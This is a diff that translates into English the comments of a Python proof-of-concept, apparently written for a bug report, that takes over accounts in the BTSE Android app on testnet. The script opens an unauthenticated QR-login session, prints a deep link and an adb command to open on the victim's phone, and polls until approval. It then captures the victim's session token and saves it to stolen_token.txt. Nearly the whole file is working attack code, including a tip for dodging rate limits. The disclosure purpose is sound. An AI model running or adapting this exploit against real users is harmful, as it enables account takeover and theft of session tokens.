@@ -1,19 +1,19 @@
 #!/usr/bin/env python3
 """
 Draft E — Deep link -> QR-login approval ATO (BTSE Android, testnet)
-Sisi PENYERANG: jalankan di PC. Tanpa dependensi (python3 stdlib).
+Attacker side: run on a PC. No dependencies (python3 stdlib).
 
-Alur:
-  1. Minta sessionId  -> POST /api/qr/session        (tanpa auth)
-  2. Tampilkan link deeplink untuk dibuka di HP korban
-  3. Poll              -> POST /api/qr/poll           (tanpa auth)
-     - status PENDING  : menunggu
-     - status SCANNED  : app korban sudah AUTO-CLAIM (buka link = klaim, tanpa aksi!)
-     - status SUCCESS  : korban tap Approve -> TOKEN KORBAN TERBIT
-  4. Cetak + simpan token (bukti ATO)
+Flow:
+  1. Request sessionId  -> POST /api/qr/session        (no auth)
+  2. Show the deeplink to open on the victim's phone
+  3. Poll               -> POST /api/qr/poll           (no auth)
+     - status PENDING  : waiting
+     - status SCANNED  : victim's app has AUTO-CLAIMED (opening the link = claim, no action!)
+     - status SUCCESS  : victim taps Approve -> VICTIM TOKEN ISSUED
+  4. Print + save the token (ATO proof)
 
-Pakai: python3 poc_deeplink_attacker.py
-Masa berlaku sessionId ±180 detik — rekam segera setelah start.
+Usage: python3 poc_deeplink_attacker.py
+sessionId TTL ±180 seconds — record immediately after start.
 """
 import base64
 import json
@@ -25,8 +25,8 @@ import urllib.request
 import urllib.error
 
 BASE = "https://testapi.btse.io"
-# Split rate-limit buckets: attacker polling boleh direct (IP runner)
-# sementara app korban tetap via SG proxy. Kosong = direct.
+# Split rate-limit buckets: attacker polling may go direct (runner IP)
+# while the victim's app stays on the SG proxy. Empty = direct.
 PROXY = os.environ.get("ATTACKER_PROXY", "").strip()
 
 
@@ -79,7 +79,7 @@ def main():
     sid = json.loads(body)["data"]
     print(f"[attacker] sessionId = {sid}")
     try:
-        open("poc_sid.txt", "w").write(sid)  # koordinasi otomatis sisi demo
+        open("poc_sid.txt", "w").write(sid)  # automatic demo-side coordination
     except OSError:
         pass
 
@@ -90,16 +90,16 @@ def main():
     )
     alt_link = f"app://app.btse.com/app/session/authorize?sessionId={sid}"
 
-    banner("BUKA LINK INI DI HP KORBAN (app BTSE testnet, login A1)")
+    banner("OPEN THIS LINK ON THE VICTIM'S PHONE (BTSE testnet app, login A1)")
     print(intent_link)
-    print("\n(varian alternatif, dari browser/manapun):")
+    print("\n(alternate variant, from any browser):")
     print(alt_link)
-    print("\n[Jika ada adb] perintah setara:")
+    print("\n[If adb is available] equivalent command:")
     print(
         f'  adb shell am start -a android.intent.action.VIEW '
         f'-d "app://app.btse.com/app/session/authorize?sessionId={sid}" com.btse.finance'
     )
-    print("\n>> Rekam layar HP + layar PC ini sekarang. TTL sessionId ±180 detik.")
+    print("\n>> Record the phone screen + this PC screen now. sessionId TTL ±180 seconds.")
 
     deadline = time.time() + 300
     last = None
@@ -123,9 +123,9 @@ def main():
         if status != last:
             t = time.strftime("%H:%M:%S")
             if status == "SCANNED":
-                banner(f"[{t}] SCANNED — app korban AUTO-CLAIM (tanpa scan apa pun!)")
+                banner(f"[{t}] SCANNED — victim's app AUTO-CLAIMED (no scan needed!)")
             elif status == "SUCCESS":
-                banner(f"[{t}] SUCCESS — KORBAN TAP APPROVE -> TOKEN TERBIT")
+                banner(f"[{t}] SUCCESS — VICTIM TAPPED APPROVE -> TOKEN ISSUED")
             else:
                 print(f"[{t}] status = {status}")
             last = status
@@ -135,13 +135,13 @@ def main():
             print(f"[ATO] token  = {tok}")
             print(f"[ATO] claims = {json.dumps(decode_jwt(tok))}")
             open("stolen_token.txt", "w").write(tok or "")
-            print("[ATO] disimpan -> stolen_token.txt")
-            banner("POC SELESAI — token akun korban berada di kanal penyerang")
+            print("[ATO] saved -> stolen_token.txt")
+            banner("POC COMPLETE — the victim account token is in the attacker's channel")
             return
-        # backoff ringan utk hindari rate-limit testapi (status persist di server, tak lost)
+        # light backoff to dodge testapi rate-limits (status persists server-side, nothing lost)
         time.sleep(4)
 
-    banner("TIMEOUT (5 menit) — jalankan ulang untuk sessionId baru")
+    banner("TIMEOUT (5 minutes) — run again for a new sessionId")
 
 
 if __name__ == "__main__":
